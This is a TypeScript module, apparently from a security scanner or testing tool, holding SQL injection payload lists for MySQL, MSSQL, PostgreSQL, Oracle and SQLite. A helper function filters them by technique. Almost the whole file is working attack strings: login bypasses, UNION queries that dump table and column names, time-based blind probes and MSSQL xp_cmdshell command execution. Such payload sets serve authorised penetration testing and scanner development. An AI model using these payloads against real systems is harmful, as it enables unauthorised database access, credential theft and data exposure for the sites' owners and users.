// SQL injection payloads for different database types and techniques

// Get payloads based on database type, technique, and limit
export function getPayloads(
  databaseType: string | null = null,
  technique: string | null = null,
  limit: number | null = null,
): string[] {
  let payloads: string[] = []

  // Add payloads based on database type
  if (!databaseType || databaseType.toLowerCase() === "mysql") {
    payloads = payloads.concat(MYSQL_PAYLOADS)
  }

  if (!databaseType || databaseType.toLowerCase() === "mssql") {
    payloads = payloads.concat(MSSQL_PAYLOADS)
  }

  if (!databaseType || databaseType.toLowerCase() === "postgresql") {
    payloads = payloads.concat(POSTGRESQL_PAYLOADS)
  }

  if (!databaseType || databaseType.toLowerCase() === "oracle") {
    payloads = payloads.concat(ORACLE_PAYLOADS)
  }

  if (!databaseType || databaseType.toLowerCase() === "sqlite") {
    payloads = payloads.concat(SQLITE_PAYLOADS)
  }

  // Filter by technique if specified
  if (technique) {
    const techLower = technique.toLowerCase()
    if (techLower === "error") {
      payloads = payloads.filter((p) => ERROR_BASED_PAYLOADS.some((ep) => p.includes(ep)))
    } else if (techLower === "union") {
      payloads = payloads.filter((p) => UNION_BASED_PAYLOADS.some((up) => p.includes(up)))
    } else if (techLower === "blind") {
      payloads = payloads.filter((p) => BLIND_PAYLOADS.some((bp) => p.includes(bp)))
    } else if (techLower === "time") {
      payloads = payloads.filter((p) => TIME_BASED_PAYLOADS.some((tp) => p.includes(tp)))
    } else if (techLower === "auth") {
      payloads = payloads.filter((p) => AUTH_BYPASS_PAYLOADS.some((ap) => p.includes(ap)))
    }
  }

  // Shuffle the payloads to ensure variety
  payloads = shuffleArray(payloads)

  // Limit the number of payloads if specified
  if (limit && limit > 0 && limit < payloads.length) {
    payloads = payloads.slice(0, limit)
  }

  return payloads
}

// Helper function to shuffle an array
function shuffleArray<T>(array: T[]): T[] {
  const newArray = [...array]
  for (let i = newArray.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[newArray[i], newArray[j]] = [newArray[j], newArray[i]]
  }
  return newArray
}

// Common SQL injection payload patterns by technique
const ERROR_BASED_PAYLOADS = [
  "AND extractvalue(",
  "AND updatexml(",
  "AND (SELECT * FROM (SELECT(SLEEP(",
  "AND CAST(",
  "AND CONVERT(",
  "AND JSON_KEYS(",
  "AND ELT(",
]

const UNION_BASED_PAYLOADS = ["UNION SELECT", "UNION ALL SELECT", "UNION SELECT NULL", "UNION ALL SELECT NULL"]

const BLIND_PAYLOADS = ["AND 1=1", "AND 1=2", "OR 1=1", "OR 1=2", "AND (SELECT COUNT(*) FROM", "AND EXISTS("]

const TIME_BASED_PAYLOADS = [
  "SLEEP(",
  "BENCHMARK(",
  "pg_sleep(",
  "WAITFOR DELAY",
  "GENERATE_SERIES",
  "dbms_pipe.receive_message",
]

const AUTH_BYPASS_PAYLOADS = [
  "' OR '1'='1",
  "' OR 1=1--",
  "' OR '1'='1' --",
  "admin'--",
  "admin' #",
  "' OR 1=1 LIMIT 1--",
]

// MySQL payloads
const MYSQL_PAYLOADS = [
  "' OR 1=1--",
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR 1=1#",
  "' OR 1=1 LIMIT 1#",
  "' UNION SELECT 1,2,3--",
  "' UNION SELECT 1,2,3,4--",
  "' UNION SELECT 1,2,3,4,5--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT @@version,NULL,NULL--",
  "' UNION SELECT user(),NULL,NULL--",
  "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
  "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
  "' AND SLEEP(5)--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
  "' OR SLEEP(5)--",
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND extractvalue(1, concat(0x7e, (SELECT version())))--",
  "' AND updatexml(1, concat(0x7e, (SELECT version())), 1)--",
  "' AND (SELECT COUNT(*) FROM information_schema.tables)--",
  "' PROCEDURE ANALYSE()--",
  "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))--",
  "' AND ELT(1=1,SLEEP(5))--",
  "' AND BENCHMARK(5000000,MD5(1))--",
]

// MSSQL payloads
const MSSQL_PAYLOADS = [
  "' OR 1=1--",
  "' OR '1'='1'--",
  "' UNION SELECT 1,2,3--",
  "' UNION SELECT 1,2,3,4--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT @@version,NULL,NULL--",
  "' UNION SELECT user_name(),NULL,NULL--",
  "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
  "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
  "' WAITFOR DELAY '0:0:5'--",
  "' AND 1=1--",
  "' AND 1=2--",
  "'; WAITFOR DELAY '0:0:5'--",
  "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
  "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--",
  "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
  "' AND (SELECT COUNT(*) FROM sysusers)>0--",
  "' AND (SELECT TOP 1 name FROM sysobjects WHERE id=1)>0--",
  "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
  "' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)--",
  "' AND 1=(SELECT CASE WHEN (SELECT COUNT(*) FROM sysobjects)>0 THEN 1 ELSE 0 END)--",
]

// PostgreSQL payloads
const POSTGRESQL_PAYLOADS = [
  "' OR 1=1--",
  "' OR '1'='1'--",
  "' UNION SELECT 1,2,3--",
  "' UNION SELECT 1,2,3,4--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT version(),NULL,NULL--",
  "' UNION SELECT current_user,NULL,NULL--",
  "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
  "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
  "' AND pg_sleep(5)--",
  "' AND 1=1--",
  "' AND 1=2--",
  "'; SELECT pg_sleep(5)--",
  "' AND (SELECT count(*) FROM pg_database)>0--",
  "' AND (SELECT count(*) FROM pg_tables)>0--",
  "' AND (SELECT count(*) FROM pg_user)>0--",
  "' AND (SELECT current_database())='postgres'--",
  "' AND EXISTS(SELECT 1 FROM pg_tables)--",
  "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
  "' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
  "' AND 1=(CASE WHEN (1=2) THEN 1 ELSE 0 END)--",
]

// Oracle payloads
const ORACLE_PAYLOADS = [
  "' OR 1=1--",
  "' OR '1'='1'--",
  "' UNION SELECT 1,2,3 FROM DUAL--",
  "' UNION SELECT NULL,NULL,NULL FROM DUAL--",
  "' UNION SELECT banner,NULL,NULL FROM v$version--",
  "' UNION SELECT user,NULL,NULL FROM DUAL--",
  "' UNION SELECT table_name,NULL,NULL FROM all_tables--",
  "' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--",
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND (SELECT COUNT(*) FROM all_tables)>0--",
  "' AND (SELECT COUNT(*) FROM all_users)>0--",
  "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) IS NOT NULL--",
  "' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
  "' AND 1=(CASE WHEN (1=2) THEN 1 ELSE 0 END)--",
  "' AND 1=(CASE WHEN (SELECT COUNT(*) FROM all_tables)>0 THEN 1 ELSE 0 END)--",
  "' AND dbms_pipe.receive_message('RDS',5)=0--",
  "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
]

// SQLite payloads
const SQLITE_PAYLOADS = [
  "' OR 1=1--",
  "' OR '1'='1'--",
  "' UNION SELECT 1,2,3--",
  "' UNION SELECT 1,2,3,4--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION SELECT sqlite_version(),NULL,NULL--",
  "' UNION SELECT name,NULL,NULL FROM sqlite_master--",
  "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'--",
  "' AND 1=1--",
  "' AND 1=2--",
  "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
  "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) IS NOT NULL--",
  "' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
  "' AND 1=(CASE WHEN (1=2) THEN 1 ELSE 0 END)--",
  "' AND 1=(CASE WHEN (SELECT COUNT(*) FROM sqlite_master)>0 THEN 1 ELSE 0 END)--",
  "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--",
  "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)=1--",
  "' AND randomblob(1000000000)--",
]
